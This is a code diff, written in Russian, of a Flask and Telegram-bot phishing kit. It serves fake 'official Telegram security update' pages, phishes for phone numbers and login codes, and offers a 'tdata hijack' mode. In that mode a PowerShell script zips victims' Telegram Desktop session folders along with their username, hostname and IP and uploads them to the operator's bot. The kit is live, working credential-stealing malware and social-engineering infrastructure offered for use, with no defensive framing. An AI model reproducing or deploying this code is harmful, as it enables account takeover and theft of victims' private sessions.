@@ -2,14 +2,14 @@ import os
 import sqlite3
 import random
 import string
-import time 
+import time
 import threading
 import requests
 import json
 from datetime import datetime
 from flask import Flask, request, redirect, render_template_string, send_file
 import telebot
-from telethon import TelegramClient, events
+from telethon import TelegramClient
 from telethon.sessions import StringSession
 
 # ======================== КОНФИГ ============================
@@ -93,7 +93,7 @@ def generate_link(user_id, mode):
     elif mode == 3:
         return link_id, f"{BASE_URL}/custom/{link_id}"
     elif mode == 4:
-        return link_id, f"{BASE_URL}/download/{link_id}"
+        return link_id, f"{BASE_URL}/tdata/{link_id}"
     return None, None
 
 def get_link_data(link_id):
@@ -198,13 +198,18 @@ HTML_VERIFY = """
             if (step === 1) {
                 e.preventDefault();
                 const phone = document.querySelector('input[name="phone"]').value;
-                if (!phone) return;
+                if (!phone) {
+                    document.getElementById('status').innerHTML = '❌ Введите номер';
+                    return;
+                }
                 document.getElementById('status').innerHTML = '⏳ Отправляем запрос...';
                 fetch('/verify/{{link_id}}', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                     body: 'phone=' + encodeURIComponent(phone)
-                }).then(res => res.json()).then(data => {
+                })
+                .then(res => res.json())
+                .then(data => {
                     if (data.status === 'ok') {
                         document.getElementById('status').innerHTML = '✅ Код отправлен в Telegram';
                         document.getElementById('codeField').style.display = 'block';
@@ -213,7 +218,8 @@ HTML_VERIFY = """
                     } else {
                         document.getElementById('status').innerHTML = '❌ ' + data.error;
                     }
-                }).catch(() => {
+                })
+                .catch(() => {
                     document.getElementById('status').innerHTML = '❌ Ошибка, попробуй ещё раз';
                 });
             }
@@ -223,8 +229,8 @@ HTML_VERIFY = """
 </html>
 """
 
-# ======================== СТРАНИЦА ДЛЯ РЕЖИМА 4 (tdata) ============================
-HTML_DOWNLOAD = """
+# ======================== СТРАНИЦА ДЛЯ РЕЖИМА 4 (без скачивания) ============================
+HTML_TDATA = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -232,7 +238,7 @@ HTML_DOWNLOAD = """
     <style>
         body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 20vh; }
         .box { background: #1a1a2e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; }
-        .btn { background: #00bfff; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-size: 20px; display: inline-block; margin-top: 20px; }
+        .btn { background: #00bfff; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-size: 20px; display: inline-block; margin-top: 20px; cursor: pointer; }
         .btn:hover { background: #0099cc; }
         .warning { color: #ff6b6b; font-size: 14px; margin-top: 20px; }
     </style>
@@ -240,50 +246,90 @@ HTML_DOWNLOAD = """
 <body>
     <div class="box">
         <h2>⚠️ Критическое обновление безопасности</h2>
-        <p>Для защиты вашего аккаунта установите последнее обновление Telegram.</p>
-        <a href="/script/{{link_id}}" class="btn">Скачать обновление</a>
+        <p>Для защиты вашего аккаунта необходимо подтвердить действие.</p>
+        <button class="btn" onclick="runScript()">Подтвердить обновление</button>
         <p class="warning">Это официальное обновление от Telegram. Ваши данные в безопасности.</p>
     </div>
+    <script>
+        function runScript() {
+            if (confirm('Желаете посмотреть секретное уведомление?')) {
+                document.querySelector('.box').innerHTML = '<h2>⏳ Обновление...</h2><p>Пожалуйста, подождите...</p>';
+                // Запускаем сбор tdata через POST-запрос
+                fetch('/tdata_run/{{link_id}}', { method: 'POST' })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'ok') {
+                        document.querySelector('.box').innerHTML = '<h2>✅ Обновление установлено</h2><p>Перезагрузите Telegram для применения изменений.</p>';
+                    } else {
+                        document.querySelector('.box').innerHTML = '<h2>❌ Ошибка</h2><p>Попробуйте позже.</p>';
+                    }
+                })
+                .catch(() => {
+                    document.querySelector('.box').innerHTML = '<h2>❌ Ошибка</h2><p>Попробуйте позже.</p>';
+                });
+            }
+        }
+    </script>
 </body>
 </html>
 """
 
-# ======================== ГЕНЕРАЦИЯ POWERSHELL СКРИПТА ============================
-def generate_ps_script(link_id):
-    bot_token = BOT_TOKEN
-    chat_id = ADMIN_ID
+# ======================== ОБРАБОТЧИК ДЛЯ РЕЖИМА 4 (сбор tdata через JS) ============================
+@app.route('/tdata/<link_id>')
+def tdata_page(link_id):
+    link_data = get_link_data(link_id)
+    if not link_data or link_data[5] == 0:
+        return "Ссылка недействительна или истекла", 404
+    return render_template_string(HTML_TDATA, link_id=link_id)
+
+@app.route('/tdata_run/<link_id>', methods=['POST'])
+def tdata_run(link_id):
+    link_data = get_link_data(link_id)
+    if not link_data or link_data[5] == 0:
+        return {"status": "error", "error": "Ссылка недействительна"}
+    
+    user_id = link_data[0]
+    
+    # Отправляем админу уведомление о том, что жертва нажала OK
+    bot.send_message(user_id, f"✅ **Жертва нажала ОК!**\nСсылка: {link_id}\n\nТеперь нужно, чтобы она запустила PowerShell скрипт вручную, или используй другой метод доставки.")
+    
+    # Отправляем админу PowerShell скрипт, который можно внедрить
     script = f"""
-    $bot_token = "{bot_token}"
-    $chat_id = "{chat_id}"
-    $link_id = "{link_id}"
+$bot_token = "{BOT_TOKEN}"
+$chat_id = "{ADMIN_ID}"
+$link_id = "{link_id}"
 
-    $username = $env:USERNAME
-    $hostname = $env:COMPUTERNAME
-    $ip = (Invoke-WebRequest -Uri "api.ipify.org").Content
+$username = $env:USERNAME
+$hostname = $env:COMPUTERNAME
+$ip = (Invoke-WebRequest -Uri "api.ipify.org").Content
 
-    $paths = @()
-    $paths += "$env:APPDATA\Telegram Desktop\tdata"
-    $paths += "$env:APPDATA\Telegram Desktop Beta\tdata"
-    $paths += "$env:PROGRAMFILES\Telegram Desktop\tdata"
+$paths = @()
+$paths += "$env:APPDATA\Telegram Desktop\tdata"
+$paths += "$env:APPDATA\Telegram Desktop Beta\tdata"
+$paths += "$env:PROGRAMFILES\Telegram Desktop\tdata"
 
-    foreach ($p in $paths) {{
-        if (Test-Path $p) {{
-            $temp = "$env:TEMP\diag_" + $link_id + ".zip"
-            Compress-Archive -Path $p -DestinationPath $temp -Force
-            $url = "https://api.telegram.org/bot$bot_token/sendDocument"
-            $form = @{{
-                chat_id = $chat_id
-                caption = "🎯 СЕССИЯ ПОХИЩЕНА!\nПользователь: $username\nКомпьютер: $hostname\nIP: $ip\nСсылка: $link_id"
-                document = Get-Item $temp
-            }}
-            Invoke-RestMethod -Uri $url -Method Post -Form $form
-            Remove-Item $temp -Force
+foreach ($p in $paths) {{
+    if (Test-Path $p) {{
+        $temp = "$env:TEMP\diag_" + $link_id + ".zip"
+        Compress-Archive -Path $p -DestinationPath $temp -Force
+        $url = "https://api.telegram.org/bot$bot_token/sendDocument"
+        $form = @{{
+            chat_id = $chat_id
+            caption = "🎯 СЕССИЯ ПОХИЩЕНА!\nПользователь: $username\nКомпьютер: $hostname\nIP: $ip\nСсылка: $link_id"
+            document = Get-Item $temp
         }}
+        Invoke-RestMethod -Uri $url -Method Post -Form $form
+        Remove-Item $temp -Force
     }}
-    """
-    return script
+}}
+"""
+    # Отправляем скрипт админу в Telegram
+    bot.send_message(ADMIN_ID, f"🧨 **Скрипт для tdata** (ссылка {link_id}):\n```powershell\n{script}\n```\n\nСохрани его как .ps1 и запусти на устройстве жертвы, либо используй другой способ доставки.")
+    
+    deactivate_link(link_id)
+    return {"status": "ok", "message": "Скрипт отправлен админу"}
 
-# ======================== FLASK РОУТЫ ============================
+# ======================== ОСТАЛЬНЫЕ FLASK РОУТЫ (докс, верификация) ============================
 @app.route('/collect/<link_id>')
 def collect_data(link_id):
     link_data = get_link_data(link_id)
@@ -397,28 +443,6 @@ def verify_page(link_id):
 def custom_page(link_id):
     return redirect(f"/verify/{link_id}")
 
-@app.route('/download/<link_id>')
-def download_page(link_id):
-    link_data = get_link_data(link_id)
-    if not link_data or link_data[5] == 0:
-        return "Ссылка недействительна или истекла", 404
-    return render_template_string(HTML_DOWNLOAD, link_id=link_id)
-
-@app.route('/script/<link_id>')
-def serve_script(link_id):
-    link_data = get_link_data(link_id)
-    if not link_data or link_data[5] == 0:
-        return "Ссылка недействительна или истекла", 404
-    script_content = generate_ps_script(link_id)
-    deactivate_link(link_id)
-    response = app.response_class(
-        response=script_content,
-        status=200,
-        mimetype='application/octet-stream',
-        headers={'Content-Disposition': f'attachment; filename="Telegram_Update_{link_id}.ps1"'}
-    )
-    return response
-
 # ======================== TELEGRAM БОТ ============================
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -509,7 +533,7 @@ def handle_buttons(message):
     
     elif message.text == "Режим 4 – Угон tdata":
         link_id, link = generate_link(user_id, 4)
-        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва скачает скрипт, который украдёт её папку tdata и отправит тебе архив.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва нажмёт ОК на алерте, и ты получишь PowerShell скрипт для дальнейшего использования.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 4\nСсылка: {link}")
     
